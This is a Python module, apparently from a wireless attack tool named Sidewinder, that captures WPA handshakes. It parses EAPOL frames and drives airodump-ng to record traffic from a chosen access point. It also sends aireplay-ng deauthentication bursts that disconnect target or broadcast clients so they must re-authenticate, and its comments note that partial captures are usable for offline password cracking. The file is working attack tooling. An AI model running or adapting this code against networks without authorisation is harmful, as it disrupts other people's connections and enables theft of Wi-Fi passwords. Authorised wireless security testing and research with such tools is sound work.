"""Sidewinder Capture Engine.

Captures WPA handshakes via passive listening or active deauth.

Critical design decisions:
1. EAPOL detection does NOT happen via airodump-ng stdout.
   airodump-ng stdout contains screen refresh escape sequences, not EAPOL data.
   EAPOL detection requires polling the PCAP file with scapy.

2. poll_eapol() runs as a SEPARATE asyncio task from the capture loop.
   This avoids the "stop condition on wrong channel" race condition.

3. capture_deauth() takes channel as an explicit parameter — never looks
   it up dynamically to avoid the race where channel isn't known yet.

EAPOL validation uses proper IEEE 802.11-2020 Table 12-6 key_info bitmasks.
"""
from __future__ import annotations

import asyncio
import hashlib
import logging
import os
import time
from typing import Callable, Optional

from ..core.session import HandshakeResult
from .subprocess_mgr import SubprocessManager, get_manager

logger = logging.getLogger(__name__)

# IEEE 802.11-2020 Table 12-6: Key Info bits for EAPOL-Key frames
KEY_INFO_PAIRWISE = 0x0008   # Bit 3: Pairwise key (not group)
KEY_INFO_INSTALL  = 0x0040   # Bit 6: Install key
KEY_INFO_ACK      = 0x0080   # Bit 7: ACK
KEY_INFO_MIC      = 0x0100   # Bit 8: MIC present
KEY_INFO_SECURE   = 0x0200   # Bit 9: Secure


def _key_attr(key, name: str, default: int = 0) -> int:
    try:
        return int(getattr(key, name, default))
    except (TypeError, ValueError):
        return default


def is_m1(key) -> bool:
    """M1: Pairwise=1, Install=0, ACK=1, MIC=0, Secure=0."""
    if isinstance(key, int):
        return (
            bool(key & KEY_INFO_PAIRWISE)
            and not (key & KEY_INFO_INSTALL)
            and bool(key & KEY_INFO_ACK)
            and not (key & KEY_INFO_MIC)
            and not (key & KEY_INFO_SECURE)
        )
    return (
        _key_attr(key, "key_type") == 1
        and _key_attr(key, "install") == 0
        and _key_attr(key, "key_ack") == 1
        and _key_attr(key, "has_key_mic") == 0
        and _key_attr(key, "secure") == 0
    )


def is_m2(key) -> bool:
    """M2: Pairwise=1, Install=0, ACK=0, MIC=1, Secure=0."""
    if isinstance(key, int):
        return (
            bool(key & KEY_INFO_PAIRWISE)
            and not (key & KEY_INFO_INSTALL)
            and not (key & KEY_INFO_ACK)
            and bool(key & KEY_INFO_MIC)
            and not (key & KEY_INFO_SECURE)
        )
    return (
        _key_attr(key, "key_type") == 1
        and _key_attr(key, "install") == 0
        and _key_attr(key, "key_ack") == 0
        and _key_attr(key, "has_key_mic") == 1
        and _key_attr(key, "secure") == 0
    )


def is_m3(key) -> bool:
    """M3: Pairwise=1, Install=1, ACK=1, MIC=1, Secure=1."""
    if isinstance(key, int):
        return (
            bool(key & KEY_INFO_PAIRWISE)
            and bool(key & KEY_INFO_INSTALL)
            and bool(key & KEY_INFO_ACK)
            and bool(key & KEY_INFO_MIC)
            and bool(key & KEY_INFO_SECURE)
        )
    return (
        _key_attr(key, "key_type") == 1
        and _key_attr(key, "install") == 1
        and _key_attr(key, "key_ack") == 1
        and _key_attr(key, "has_key_mic") == 1
        and _key_attr(key, "secure") == 1
    )


def is_m4(key) -> bool:
    """M4: Pairwise=1, Install=0, ACK=0, MIC=1, Secure=1."""
    if isinstance(key, int):
        return (
            bool(key & KEY_INFO_PAIRWISE)
            and not (key & KEY_INFO_INSTALL)
            and not (key & KEY_INFO_ACK)
            and bool(key & KEY_INFO_MIC)
            and bool(key & KEY_INFO_SECURE)
        )
    return (
        _key_attr(key, "key_type") == 1
        and _key_attr(key, "install") == 0
        and _key_attr(key, "key_ack") == 0
        and _key_attr(key, "has_key_mic") == 1
        and _key_attr(key, "secure") == 1
    )


def _eapol_key_candidates(pkt, eapol_cls) -> list:
    """Return Scapy EAPOL-key representations across Scapy versions."""
    eapol = pkt[eapol_cls]
    candidates = []
    if hasattr(eapol, "key_info"):
        candidates.append(int(getattr(eapol, "key_info")))
    payload = getattr(eapol, "payload", None)
    if payload is not None and hasattr(payload, "key_ack"):
        candidates.append(payload)
    return candidates


def _key_info_value(key) -> Optional[int]:
    if isinstance(key, int):
        return key
    try:
        pairwise = _key_attr(key, "key_type") << 3
        install = _key_attr(key, "install") << 6
        ack = _key_attr(key, "key_ack") << 7
        mic = _key_attr(key, "has_key_mic") << 8
        secure = _key_attr(key, "secure") << 9
        return pairwise | install | ack | mic | secure
    except Exception:
        return None


def _message_name(key) -> str:
    if is_m1(key):
        return "M1"
    if is_m2(key):
        return "M2"
    if is_m3(key):
        return "M3"
    if is_m4(key):
        return "M4"
    return "UNKNOWN"


def extract_handshake_messages(cap_file: str) -> list[dict[str, str]]:
    """Extract first observed M1-M4 EAPOL key-info values from a capture file.

    This is read-only and supports both Scapy key_info fields and payload
    attribute representations used by different Scapy versions.
    """
    try:
        from scapy.all import PcapReader  # type: ignore
        from scapy.layers.eap import EAPOL  # type: ignore
    except ImportError:
        return []

    messages: dict[str, dict[str, str]] = {}
    try:
        with PcapReader(cap_file) as reader:
            for index, pkt in enumerate(reader, 1):
                if not pkt.haslayer(EAPOL):
                    continue
                for candidate in _eapol_key_candidates(pkt, EAPOL):
                    name = _message_name(candidate)
                    if name == "UNKNOWN" or name in messages:
                        continue
                    key_info = _key_info_value(candidate)
                    if key_info is None:
                        continue
                    messages[name] = {
                        "message": name,
                        "packet": str(index),
                        "key_info_hex": f"0x{key_info:04x}",
                        "key_info_binary": f"{key_info:016b}",
                        "pairwise": "1" if key_info & KEY_INFO_PAIRWISE else "0",
                        "install": "1" if key_info & KEY_INFO_INSTALL else "0",
                        "ack": "1" if key_info & KEY_INFO_ACK else "0",
                        "mic": "1" if key_info & KEY_INFO_MIC else "0",
                        "secure": "1" if key_info & KEY_INFO_SECURE else "0",
                    }
                if len(messages) == 4:
                    break
    except Exception as e:
        logger.debug("Cannot extract handshake messages from %s: %s", cap_file, e)
        return []

    return [messages[name] for name in ("M1", "M2", "M3", "M4") if name in messages]


def validate_handshake(cap_file: str) -> HandshakeResult:
    """Validate WPA 4-way handshake in a capture file using scapy.

    Uses proper IEEE 802.11-2020 Table 12-6 key_info bitmasks.
    The previous single-bit approach was wrong:
      - M3 check in elif chain could never trigger (M3 also has bit 0x0080 like M1)
      - Must check ALL relevant bits together to distinguish M1/M2/M3/M4.

    Args:
        cap_file: Path to .cap/.pcap file

    Returns:
        HandshakeResult with m1/m2/m3/m4 flags and status
    """
    try:
        from scapy.all import rdpcap  # type: ignore
        from scapy.layers.eap import EAPOL  # type: ignore
    except ImportError:
        logger.error("scapy not installed — run: pip install scapy")
        return HandshakeResult(status="invalid")

    try:
        packets = rdpcap(cap_file)
    except Exception as e:
        logger.debug("Cannot read cap file %s: %s", cap_file, e)
        return HandshakeResult(status="invalid")

    eapols = [p for p in packets if p.haslayer(EAPOL)]
    m1 = m2 = m3 = m4 = False

    for pkt in eapols:
        for eapol_key in _eapol_key_candidates(pkt, EAPOL):
            if is_m1(eapol_key):
                m1 = True
            if is_m2(eapol_key):
                m2 = True
            if is_m3(eapol_key):
                m3 = True
            if is_m4(eapol_key):
                m4 = True

    # Determine capture status
    if m1 and m2 and m3 and m4:
        status = "full"
    elif m1 and m2:
        status = "partial"  # Usable for offline crack (M1+M2 have nonces + MIC)
    else:
        status = "invalid"

    # SHA-256 of capture file
    try:
        with open(cap_file, "rb") as f:
            sha256 = hashlib.sha256(f.read()).hexdigest()
    except OSError:
        sha256 = ""

    return HandshakeResult(
        status=status,
        m1=m1, m2=m2, m3=m3, m4=m4,
        sha256=sha256,
        eapol_count=len(eapols),
    )


async def poll_eapol(
    pcap_file: str,
    bssid: str,
    timeout: float = 300.0,
    poll_interval: float = 2.0,
    on_progress: Optional[Callable[[bool, bool, bool, bool, str], None]] = None,
) -> Optional[HandshakeResult]:
    """Poll a PCAP file for EAPOL handshake as a separate async task.

    IMPORTANT: EAPOL detection cannot happen via airodump-ng stdout.
    airodump-ng prints AP/client table refreshes to stdout, not frame details.
    We must poll the PCAP file directly with scapy.

    Args:
        pcap_file: Path to the .cap file airodump-ng is writing
        bssid: Target BSSID (for filtering, currently checks any EAPOL)
        timeout: Max seconds to wait (default 5 minutes)
        poll_interval: Seconds between checks (default 2s)
        on_progress: Optional callback for UI updates

    Returns:
        HandshakeResult if found, None on timeout
    """
    try:
        from scapy.all import PcapReader
        from scapy.layers.eap import EAPOL
    except ImportError:
        logger.error("scapy not installed — run: pip install scapy")
        return None

    start = time.time()
    logger.info("Polling for EAPOL in %s (timeout=%ds)", pcap_file, int(timeout))

    # Wait for file to be created
    while not os.path.exists(pcap_file) and time.time() - start < timeout:
        await asyncio.sleep(1.0)
        
    if not os.path.exists(pcap_file):
        return None

    m1 = m2 = m3 = m4 = False
    eapol_count = 0
    status = "waiting"

    f = open(pcap_file, "rb")
    reader = None
    try:
        while time.time() - start < timeout:
            try:
                # If file is empty or header is not fully written, PcapReader raises Scapy_Exception
                if os.path.getsize(pcap_file) < 24:
                    await asyncio.sleep(poll_interval)
                    continue
                
                if reader is None:
                    try:
                        reader = PcapReader(f)
                    except Exception as e:
                        # Header might not be completely flushed yet
                        await asyncio.sleep(poll_interval)
                        continue

                for pkt in reader:
                    if pkt.haslayer(EAPOL):
                        eapol_count += 1
                        for eapol_key in _eapol_key_candidates(pkt, EAPOL):
                            if is_m1(eapol_key): m1 = True
                            if is_m2(eapol_key): m2 = True
                            if is_m3(eapol_key): m3 = True
                            if is_m4(eapol_key): m4 = True

                if m1 and m2 and m3 and m4:
                    status = "full"
                elif m1 and m2:
                    status = "partial"

                if on_progress:
                    on_progress(m1, m2, m3, m4, status)

                if status == "full":
                    logger.info("Handshake found! M1-M4 captured.")
                    break
                    
            except EOFError:
                pass  # Reached end of file, wait for more
            except Exception as e:
                logger.debug("Error reading pcap: %s", e)

            await asyncio.sleep(poll_interval)
            
        f.seek(0)
        sha256 = hashlib.sha256(f.read()).hexdigest()

        if status in ("partial", "full"):
            return HandshakeResult(
                status=status,
                m1=m1, m2=m2, m3=m3, m4=m4,
                sha256=sha256,
                eapol_count=eapol_count,
            )

        logger.warning("EAPOL poll timed out after %ds", int(timeout))
        return None
    finally:
        f.close()


async def capture_passive(
    mon_iface: str,
    bssid: str,
    channel: int,
    output_prefix: str,
    timeout: float = 300.0,
    mgr: Optional[SubprocessManager] = None,
    on_progress: Optional[Callable[[bool, bool, bool, bool, str], None]] = None,
) -> Optional[HandshakeResult]:
    """Passive capture — listen for handshake without interfering.

    Starts airodump-ng and simultaneously polls the PCAP file for EAPOL.
    The EAPOL poll runs as a separate asyncio task.

    Args:
        mon_iface: Monitor interface
        bssid: Target AP BSSID
        channel: Target channel (must be known before calling — no race condition)
        output_prefix: Prefix for output files (e.g., "/tmp/sidewinder_cap")
        timeout: Max seconds to wait for handshake
        mgr: Optional SubprocessManager instance
    """
    _mgr = mgr or get_manager()
    pcap_file = f"{output_prefix}-01.cap"

    if "MOCK" in mon_iface:
        # Simulated handshake capture sequence
        logger.info("[MOCK] Starting mock handshake capture simulation")
        if on_progress:
            await asyncio.sleep(1.0)
            on_progress(True, False, False, False, "partial")
            await asyncio.sleep(1.0)
            on_progress(True, True, False, False, "partial")
            await asyncio.sleep(1.0)
            on_progress(True, True, True, False, "partial")
            await asyncio.sleep(1.0)
            on_progress(True, True, True, True, "complete")
        return HandshakeResult(
            status="full",
            m1=True, m2=True, m3=True, m4=True,
            sha256="da39a3ee5e6b4b0d3255bfef95601890afd80709",
            eapol_count=4,
        )

    cmd = [
        "airodump-ng",
        mon_iface,
        "--bssid", bssid,
        "--channel", str(channel),
        "--write", output_prefix,
        "--output-format", "pcap",
        "--write-interval", "1",  # Write PCAP every 1 second
    ]

    logger.info("Starting passive capture on ch%d for %s", channel, bssid)
    proc = await _mgr.start_background(cmd)

    # EAPOL detection runs as a separate task polling the PCAP file
    eapol_task = asyncio.create_task(
        poll_eapol(pcap_file, bssid, timeout=timeout, on_progress=on_progress)
    )

    try:
        # Wait for EAPOL detection or timeout
        result = await eapol_task
    finally:
        await _mgr.kill_background(proc)

    return result


async def capture_deauth(
    mon_iface: str,
    bssid: str,
    client: str,
    channel: int,          # Must be explicit — never looked up dynamically
    output_prefix: str,
    count: int = 10,
    timeout: float = 300.0,
    mgr: Optional[SubprocessManager] = None,
    on_progress: Optional[Callable[[bool, bool, bool, bool, str], None]] = None,
) -> Optional[HandshakeResult]:
    """Active deauth + capture — kick clients to force handshake.

    Channel must be passed explicitly (from target selection phase).
    Never call get_channel() here — race condition if channel not yet known.

    Args:
        mon_iface: Monitor interface
        bssid: Target AP BSSID
        client: Target client MAC (or "FF:FF:FF:FF:FF:FF" for broadcast)
        channel: Target channel (must be known from target selection phase)
        output_prefix: Prefix for output files
        count: Number of deauth frames per burst
        timeout: Max seconds for capture
        mgr: Optional SubprocessManager instance
    """
    _mgr = mgr or get_manager()

    # Start capture first (channel is explicit — no race condition)
    capture_task = asyncio.create_task(
        capture_passive(mon_iface, bssid, channel, output_prefix, timeout, _mgr, on_progress)
    )

    # Wait 1 second for capture to initialize before sending deauths
    await asyncio.sleep(1.0)

    # Send deauth frames
    deauth_cmd = [
        "aireplay-ng",
        "--deauth", str(count),
        "-a", bssid,
        "-c", client,
        mon_iface,
    ]
    try:
        await _mgr.run(deauth_cmd, timeout=30.0, check=False)
        logger.info("Sent %d deauth frames to %s", count, client)
    except Exception as e:
        logger.warning("Deauth failed: %s", e)

    # Wait for EAPOL detection
    result = await capture_task
    return result
